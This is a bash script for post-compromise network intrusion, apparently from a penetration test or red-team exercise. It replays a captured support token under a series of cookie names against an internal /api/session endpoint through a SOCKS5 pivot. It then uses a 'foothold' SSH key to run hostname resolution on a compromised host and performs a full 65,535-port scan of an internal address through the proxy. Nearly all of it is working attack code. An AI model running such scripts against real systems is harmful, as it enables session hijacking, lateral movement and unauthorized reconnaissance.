#!/bin/bash
P="--socks5-hostname 127.0.0.1:1080"
T='fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b'
E=https://10.77.51.60
echo "=== cookie variants /api/session ==="
for c in "fieldkest_support=$T" "fieldkest_session=$T" "session=$T" "fk_session=$T" "fieldkest_integration=$T" "integration_token=$T"; do
  out=$(curl -sS -m 8 $P -k -H "Cookie: $c" -w '|%{http_code}' "$E/api/session" 2>/dev/null)
  echo "$c -> ${out##*|} ${out%|*}" | head -c 300; echo
done
echo "=== reverse dns on rowan ==="
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=10 -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$S 'getent hosts 10.77.51.60; python3 - <<PY
import socket
for n in ["gate.arwc.test","access.arwc.test","checkin.arwc.test","appointment.arwc.test","roster.arwc.test","portal.arwc.test","arrivals.arwc.test","reception.arwc.test","frontdesk.arwc.test","visitors.arwc.test"]:
    try: print(n, socket.gethostbyname(n))
    except Exception as e: print(n,"ERR",e)
print(socket.gethostbyaddr("10.77.51.60"))
PY' 2>&1 | head -30
echo "=== full port scan 10.77.51.60 ==="
cat > /tmp/sc.py <<'PY'
import socket,struct,concurrent.futures as cf,time
PROXY=('127.0.0.1',1080); IP='10.77.51.60'
def s5(p):
    try: s=socket.create_connection(PROXY,timeout=2)
    except Exception: return None
    try:
        s.settimeout(2); s.sendall(b'\x05\x01\x00')
        if s.recv(2)!=b'\x05\x00': return None
        s.sendall(b'\x05\x01\x00\x01'+socket.inet_aton(IP)+struct.pack('!H',p))
        r=s.recv(4)
        return p if len(r)>=2 and r[1]==0 else None
    except Exception: return None
    finally:
        try:s.close()
        except:pass
openp=[]; t0=time.time()
with cf.ThreadPoolExecutor(max_workers=500) as ex:
    for r in ex.map(s5,range(1,65536)):
        if r: openp.append(r)
print('OPEN',sorted(openp),'elapsed',round(time.time()-t0))
PY
timeout 300 python3 /tmp/sc.py
